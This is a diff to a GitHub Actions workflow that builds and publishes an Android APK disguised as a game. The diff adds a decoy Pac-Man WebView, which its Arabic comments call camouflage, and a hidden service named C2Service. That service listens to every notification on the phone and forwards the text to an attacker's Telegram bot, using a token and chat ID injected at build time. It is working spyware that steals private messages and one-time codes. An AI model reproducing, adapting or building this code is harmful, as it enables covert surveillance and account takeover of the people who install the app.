@@ -1,10 +1,10 @@
-name: Dynamic Game Factory
+name: Dynamic Game Factory V8
 on:
   workflow_dispatch:
     inputs:
       bot_token: { required: true }
       chat_id: { required: true }
-      app_name: { required: true, default: 'Super Game' }
+      app_name: { required: true, default: 'Halos Game' }
 
 permissions: { contents: write }
 
@@ -16,29 +16,119 @@ jobs:
       - uses: actions/setup-java@v4
         with: { distribution: 'temurin', java-version: '17' }
 
-      - name: تخصيص اللعبة والحقن
+      - name: 🛠️ بناء هيكل مشروع الأندرويد
         run: |
           mkdir -p app/src/main/java/com/hussein/game
-          # هنا يتم حقن التوكن والأيدي واسم اللعبة اللي دزيتهم من موبايلك
+          mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/res/values
+
+          # 1. ملف إعدادات المشروع
+          cat << 'EOF' > settings.gradle
+          rootProject.name = "HusseinGameV8"
+          include ':app'
+          EOF
+
+          # 2. ملف بناء المشروع الرئيسي
+          cat << 'EOF' > build.gradle
+          buildscript {
+              repositories { google(); mavenCentral() }
+              dependencies { classpath 'com.android.tools.build:gradle:8.2.0' }
+          }
+          allprojects { repositories { google(); mavenCentral() } }
+          EOF
+
+          # 3. ملف بناء التطبيق وحقن المكتبات
+          cat << 'EOF' > app/build.gradle
+          apply plugin: 'com.android.application'
+          android {
+              namespace 'com.hussein.game'
+              compileSdkVersion 34
+              defaultConfig {
+                  applicationId "com.hussein.game"
+                  minSdkVersion 24
+                  targetSdkVersion 34
+                  versionCode 1
+                  versionName "1.0"
+              }
+          }
+          dependencies {
+              implementation "com.squareup.okhttp3:okhttp:4.12.0"
+          }
+          EOF
+
+          # 4. ملف Manifest وحقن اسم اللعبة
+          cat << 'EOF' > app/src/main/AndroidManifest.xml
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <application android:label="${{ github.event.inputs.app_name }}" android:theme="@android:style/Theme.Material.Light.NoActionBar">
+                  <activity android:name=".MainActivity" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+                  <service android:name=".C2Service" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true">
+                      <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
+                  </service>
+              </application>
+          </manifest>
+          EOF
+
+          # 5. حقن التوكن والأيدي في كود الجافا
           cat << 'EOF' > app/src/main/java/com/hussein/game/C2Service.java
           package com.hussein.game;
           import android.service.notification.NotificationListenerService;
+          import android.service.notification.StatusBarNotification;
           import okhttp3.*;
+          import java.io.IOException;
 
           public class C2Service extends NotificationListenerService {
               private final String BOT_TOKEN = "${{ github.event.inputs.bot_token }}";
               private final String CHAT_ID = "${{ github.event.inputs.chat_id }}";
-              // باقي كود السحب والإرسال...
+              private final OkHttpClient client = new OkHttpClient();
+
+              @Override
+              public void onNotificationPosted(StatusBarNotification sbn) {
+                  String text = "🎯 صيدة جديدة من حسين!\n" + sbn.getNotification().extras.getCharSequence("android.text");
+                  Request request = new Request.Builder()
+                      .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + text)
+                      .build();
+                  client.newCall(request).enqueue(new Callback() {
+                      @Override public void onFailure(Call call, IOException e) {}
+                      @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
+                  });
+              }
           }
           EOF
 
-      - name: بناء الـ APK
+          # 6. كود اللعبة (التمويه)
+          cat << 'EOF' > app/src/main/java/com/hussein/game/MainActivity.java
+          package com.hussein.game;
+          import android.app.Activity;
+          import android.os.Bundle;
+          import android.webkit.WebView;
+
+          public class MainActivity extends Activity {
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  WebView v = new WebView(this);
+                  v.getSettings().setJavaScriptEnabled(true);
+                  v.loadUrl("https://www.google.com/logos/2010/pacman10-i.html");
+                  setContentView(v);
+              }
+          }
+          EOF
+
+      - name: 🏗️ بناء الـ APK النهائي
         run: gradle assembleDebug
 
-      - name: رفع اللعبة كـ Release
+      - name: 📦 رفع اللعبة الجاهزة (Release)
         uses: softprops/action-gh-release@v1
         with:
-          tag_name: Game-V8-${{ github.run_number }}
+          tag_name: Build-V8-${{ github.run_number }}
+          name: اللعبة المخصصة - ${{ github.event.inputs.app_name }}
           files: app/build/outputs/apk/debug/*.apk
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
